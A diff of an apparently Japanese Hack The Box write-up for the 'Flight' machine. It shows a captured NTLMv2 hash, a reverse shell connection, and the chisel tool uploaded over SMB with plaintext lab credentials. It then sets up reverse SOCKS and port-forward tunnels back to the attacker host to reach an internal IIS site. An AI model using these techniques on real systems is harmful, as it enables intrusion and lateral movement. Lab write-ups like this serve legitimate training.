@@ -271,7 +271,7 @@ flight\svc_apacheのntlmv2ハッシュ値を取得成功！
 
 [+] Listening for events...                                                                                                                                                                                                                 
 
-[SMB] NTLMv2-SSP Client   : 10.129.238.60
+[SMB] NTLMv2-SSP Client   : 10.129.200.222
 [SMB] NTLMv2-SSP Username : flight\svc_apache
 [SMB] NTLMv2-SSP Hash     : svc_apache::flight:7480e093cd0cc6d2:875288C3E4026DC8AF430F72BFABE029:010100000000000080D13ECEDB3CDC01BAFA2B06278EC63E00000000020008004B0036005800490001001E00570049004E002D00530058005800470056004E00330035004E004900520004003400570049004E002D00530058005800470056004E00330035004E00490052002E004B003600580049002E004C004F00430041004C00030014004B003600580049002E004C004F00430041004C00050014004B003600580049002E004C004F00430041004C000700080080D13ECEDB3CDC0106000400020000000800300030000000000000000000000000300000E49FE70A59898E7F8BD0DFAACAC25A27200865B470E26F8E5D5FFA5FA56151400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
 ```
@@ -560,4 +560,115 @@ Microsoft Windows [Version 10.0.17763.2989]
 
 C:\xampp\htdocs\school.flight.htb>whoami
 flight\svc_apache
+```
+ポート確認
+STEP1で確認されなかったtcp「8000」番ポートを確認
+```powershell
+C:\xampp\htdocs\school.flight.htb>netstat -ano -p tcp
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5796
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5796
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       916
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1516
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       496
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1136
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1712
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       660
+  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING       640
+  TCP    0.0.0.0:49694          0.0.0.0:0              LISTENING       1900
+  TCP    0.0.0.0:57875          0.0.0.0:0              LISTENING       2080
+  TCP    10.129.200.222:53      0.0.0.0:0              LISTENING       1900
+  TCP    10.129.200.222:80      10.10.16.4:36944       CLOSE_WAIT      5796
+  TCP    10.129.200.222:139     0.0.0.0:0              LISTENING       4
+  TCP    10.129.200.222:51408   10.10.16.4:4444        ESTABLISHED     5828
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       1900
+```
+8000番なのでウェブ系かも  
+windowsserver2019なのでcurlでヘッダを確認できた、どうやらiisが動作しているっぽい
+```
+C:\xampp\htdocs\school.flight.htb>curl -s -I http://127.0.0.1:8000
+HTTP/1.1 200 OK
+Content-Length: 45949
+Content-Type: text/html
+Last-Modified: Mon, 16 Apr 2018 21:23:36 GMT
+Accept-Ranges: bytes
+ETag: "03cf42dc9d5d31:0"
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+Date: Wed, 15 Oct 2025 16:42:17 GMT
+```
+kaliから8000番ポートを確認するために、chiselでトンネリングを行う
+```sh
+└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --smb-timeout 10 --share web --put-file '/home/kali/chisel_amd64.exe' '/school.flight.htb/chisel_amd64.exe'
+SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
+SMB         10.129.200.222  445    G0               [*] Copying /home/kali/chisel_amd64.exe to /school.flight.htb/chisel_amd64.exe
+SMB         10.129.200.222  445    G0               [+] Created file /home/kali/chisel_amd64.exe on \\web\/school.flight.htb/chisel_amd64.exe
+```
+[リンク](https://jieliau.medium.com/chisel-tool-for-your-lateral-movement-dd3fb398c696)を参考  
+socksプロトコルでルーティング設定
+```powershell
+C:\xampp\htdocs\school.flight.htb>.\chisel_amd64.exe client 10.10.16.4:9999 R:8888:socks
+2025/10/15 12:40:05 client: Connecting to ws://10.10.16.4:9999
+2025/10/15 12:40:09 client: Connected (Latency 255.8101ms)
+```
+kaliのchiselサーバ上での接続確認
+```sh
+└─$ chisel server -p 9999 --reverse --socks5
+2025/10/15 08:39:18 server: Reverse tunnelling enabled
+2025/10/15 08:39:18 server: Fingerprint CyGxB5Wgdmo877NNZvx4lNKq2NP3h8JGHdevkXzRkfA=
+2025/10/15 08:39:18 server: Listening on http://0.0.0.0:9999
+2025/10/15 08:40:09 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
+2025/10/15 08:40:09 server: session#1: tun: proxy#R:127.0.0.1:8888=>socks: Listening
+```
+いざ8000番にアクセス！  
+がホスト名やip関連でアクセス拒否されているっぽい、socksルーティングだから送信元はkaliのipのためアクセスできなさそう  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_04.png">  
+ということで、ポートフォワーディングに変更
+```powershell
+C:\xampp\htdocs\school.flight.htb>.\chisel_amd64.exe client --max-retry-count 10 10.10.16.4:9999 R:8888:127.0.0.1:8000
+2025/10/15 13:09:19 client: Connecting to ws://10.10.16.4:9999
+2025/10/15 13:09:23 client: Connected (Latency 261.6722ms)
+```
+kaliのchiselサーバ上での接続確認
+```sh
+└─$ chisel server -p 9999 --reverse         
+2025/10/15 09:04:44 server: Reverse tunnelling enabled
+2025/10/15 09:04:44 server: Fingerprint lRVuImptTGdVS8rg4tUTdIxmePLeCDVpQAwzqfYTLMI=
+2025/10/15 09:04:44 server: Listening on http://0.0.0.0:9999
+2025/10/15 09:09:23 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
+2025/10/15 09:09:23 server: session#1: tun: proxy#R:8888=>8000: Listening
+```
+今度は8000番のwebサイトを確認できた  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_05.png">  
+適当にファイルにアクセス、エラー内にフォルダパスを確認
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_06.png">  
+```sh
+C:\xampp\htdocs\school.flight.htb>icacls C:\inetpub\development
+C:\inetpub\development flight\C.Bum:(OI)(CI)(W)
+                       NT SERVICE\TrustedInstaller:(I)(F)
+                       NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
+                       NT AUTHORITY\SYSTEM:(I)(F)
+                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                       BUILTIN\Administrators:(I)(F)
+                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                       BUILTIN\Users:(I)(RX)
+                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
 ```
